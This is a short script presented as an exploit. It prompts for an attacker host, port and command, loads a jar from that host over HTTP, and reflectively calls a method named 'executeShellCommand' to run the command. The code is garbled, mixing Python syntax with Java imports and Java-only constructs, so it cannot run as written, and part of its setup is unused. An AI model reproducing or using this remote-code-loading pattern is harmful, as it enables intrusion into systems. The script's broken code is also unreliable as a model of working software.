import java.lang.reflect.Constructor
import java.net.URL
import java.net.URLClassLoader
import java.io.File
import java.io.FileOutputStream
import java.io.OutputStream
import java.lang.Class
import java.lang.reflect.Method

def exploit(ip, port, cmd):
    jsEngine = javax.script.ScriptEngineManager().getEngineByName("JavaScript")
    
    loader = URLClassLoader([URL("http://" + ip + ":" + port + "/exploit.jar")])
    
    clazz = loader.loadClass("com.example.VulnerableClass")
    
    constructor = clazz.getConstructor(String.class)
    
    instance = constructor.newInstance(cmd)
    
    method = clazz.getMethod("executeShellCommand", String.class)
    
    method.invoke(instance, cmd)

ip = input("LHOST: ")
port = input("LPORT: ")
cmd = input("CMD-COMMAND: ")
exploit(ip, port, cmd)
